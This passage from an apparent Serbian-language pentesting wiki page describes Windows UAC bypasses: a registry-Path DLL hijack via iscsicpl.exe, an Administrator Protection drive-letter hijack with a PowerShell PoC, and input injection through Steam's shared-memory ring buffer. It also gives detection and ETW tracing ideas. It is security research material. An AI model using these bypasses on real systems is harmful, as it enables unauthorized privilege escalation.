reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```

Ideje za detekciju:
- Upozoravajte na `reg add` / upise u registry `HKCU\Environment\Path`, nakon kojih odmah sledi izvršavanje `C:\Windows\SysWOW64\iscsicpl.exe`.
- Tražite `iscsiexe.dll` na lokacijama koje **kontroliše korisnik**, kao što su `%TEMP%` ili `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Povežite pokretanja `iscsicpl.exe` sa neočekivanim child procesima ili učitavanjem DLL-ova izvan uobičajenih Windows direktorijuma.

### Novija istraživanja koja vredi zasebno proveriti

Neki lanci napada objavljeni posle 2024. više ne liče na klasične otmice registry-ja `HKCU\Software\Classes`. Na primer, trovanje activation-context cache-a može da poveže **preusmeravanje diska** i **DLL redirection** kako bi omogućilo prelazak sa srednjeg na visok nivo integriteta, preko pouzdanih UI / auto-elevated binarnih datoteka kao što je `ctfmon.exe` i kasnijih ciljeva poput `fodhelper.exe`. Umesto da ovde ponavljamo obiman PoC, pogledajte sažete primere payload-a u:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Otmica slova diska u Administrator Protection (preview) preko DOS mape uređaja za svaku logon sesiju

> [!NOTE]
> Od avgusta 2026. Microsoft i dalje dokumentuje Administrator Protection kao **Insider preview**: uvođenje iz oktobra 2025. je povučeno i planirano za kasniji datum. Pre testiranja ovih lanaca, potvrdite da je **Admin Approval Mode with Administrator protection** zaista omogućen i da je uređaj ponovo pokrenut; sama oznaka verzije 25H2 ne dokazuje da je funkcija aktivna.<sup>[[10]](#references)</sup>

Za kompletnu površinu napada `RAiLaunchAdminProcess` / UIAccess na preview verzijama Windows 11 25H2, pogledajte posebnu stranicu:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 „Administrator Protection” koristi shadow-admin tokene sa mapama `\Sessions\0\DosDevices/<LUID>` za svaku sesiju. Direktorijum se kreira lenjo pomoću `SeGetTokenDeviceMap` pri prvom razrešavanju `\??`. Ako napadač impersonira shadow-admin token samo na nivou **SecurityIdentification**, direktorijum se kreira tako da je napadač **vlasnik** (nasleđuje `CREATOR OWNER`), čime se omogućava da linkovi slova diska imaju prednost nad `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Koraci:**

1. Iz sesije sa niskim privilegijama pozovite `RAiProcessRunOnce` da biste pokrenuli `runonce.exe` shadow-admin bez prompta.
2. Duplirajte njegov primarni token u token nivoa **identification** i impersonirajte ga dok otvarate `\??` kako biste forsirali kreiranje `\Sessions\0\DosDevices/<LUID>` u vlasništvu napadača.
3. Kreirajte simbolički link `C:` u tom direktorijumu koji pokazuje na skladište pod kontrolom napadača; naredni pristupi sistemu datoteka u toj sesiji razrešavaju `C:` kao putanju napadača, što omogućava DLL/file hijack bez prompta.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```

Na preview hostovima, Administrator Protection beleži odobrenja i neuspehe kao ETW događaje **15031** i **15032** pod `Microsoft-Windows-LUA` providerom. Događaji sadrže SID podnosioca zahteva, putanju aplikacije, ishod, upravljani administratorski nalog i metod autentifikacije, tako da ponovljeni pokušaji eksploatacije ili neuspešno upravljanje UI-jem nisu bez telemetrije.<sup>[[10]](#references)</sup>

```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```



### Unos sa bezbedne radne površine prosleđen kroz upisivi ring bafer u deljenoj memoriji

Pomoćni proces za bezbednu radnu površinu može da ugrozi UAC prompt ako korisnik sa srednjim nivoom integriteta može da piše u njegov input IPC. U prijavljenom dizajnu Steam-a, `IClientSecureDesktop::BStartStreaming` pokreće `secure_desktop_capture.exe` kao SYSTEM na `winsta0\winlogon`. Izlaže `Global\SecureDesktopInput_mem-IPCWrapper` sa korisničkim pristupom `GENERIC_ALL`; pomoćni proces čita unose iz ring bafera i poziva `SendInput` na bezbednoj radnoj površini. Ovo se razlikuje od UIAccess-a ili menjanja vrednosti `PromptOnSecureDesktop`: unos prosleđuje proces koji već radi na toj radnoj površini. Pogledajte [pokretanje service IPC-a](../windows-local-privilege-escalation/abusing-auto-updaters-and-ipc.md#shared-memory-bootstrap-into-privileged-service-ipc) da biste videli kako klijent dolazi do ovog handler-a. <sup>[[15]](#references)[[16]](#references)</sup>

Ring bafer ima 128 slotova od po 173 bajta. Brojači upisa i čitanja nalaze se na adresama `0x414` i `0x418`, a slot `N` na adresi `0x41c + 173*N`. Postavite prvi bajt slota na `0` za običan tekst, kopirajte 40-bajtni Windows `INPUT` odmah iza njega, a zatim uvećajte brojač upisa. Za administratora sa srednjim nivoom integriteta koji vidi prompt za saglasnost, pritisak i otpuštanje tastera `Y` može da aktivira potvrdno UAC dugme nakon pokretanja izvršne datoteke koja traži povišene privilegije; ne može da odgovori na prompt za akreditive standardnog korisnika. **Provera saglasnosti je i dalje bitna**: pomoćni proces prosleđuje unos tek pošto korisnik odobri njegov `InputEnabled` prompt za tekući period autorizacije od 90 dana. Samo mapiranje sa dozvolama za čitanje i pisanje nije dokaz da unos stiže do prompta; uporedite brojač čitanja pre i posle kontrolisanog testa. <sup>[[15]](#references)[[16]](#references)</sup>

## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – Kako funkcioniše User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – Zbirka tehnika za zaobilaženje UAC-a](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – Skener kompatibilnosti i pokretač za zaobilaženje UAC-a](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI koristi AI za generisanje PowerShell backdoor-a](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operacija TrueChaos: iskorišćavanje 0-day ranjivosti protiv vladinih meta u jugoistočnoj Aziji](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Zaobilaženje Windows Administrator Protection-a](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – Zaobilaženje UAC-a pomoću zadatka SilentCleanup](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – Zaobilaženja pomoću UnifiedConsent, TabTip i Narrator uz opciju Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Zaštita administratora](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
- [11] [Google Project Zero – Pozivanje lokalnih Windows RPC servera iz .NET-a](https://projectzero.google/2019/12/calling-local-windows-rpc-servers-from.html)
- [12] [Kaspersky Securelist – HoneyMyte unapređuje CoolClient pomoću potpisanog Windows kernel rootkita](https://securelist.com/honeymyte-coolclient-driver-rootkit/121028)
- [13] [Group-IB – KGB RAT: potpuno neotkriveni Windows trojanac napravljen za špijuniranje, krađu i zastrašivanje](https://www.group-ib.com/blog/kgb-rat-windows-fud-trojan/)
- [14] [LOLBAS – ComputerDefaults.exe](https://lolbas-project.github.io/lolbas/Binaries/ComputerDefaults/)
- [15] [Atredis – Okretanje ventila](https://atredis.com/blog/2026/10/28/turning-the-valve)
- [16] [Atredis – PoC-ovi za Okretanje ventila](https://github.com/atredispartners/proof-of-concept/tree/main/turning-the-valve/code)
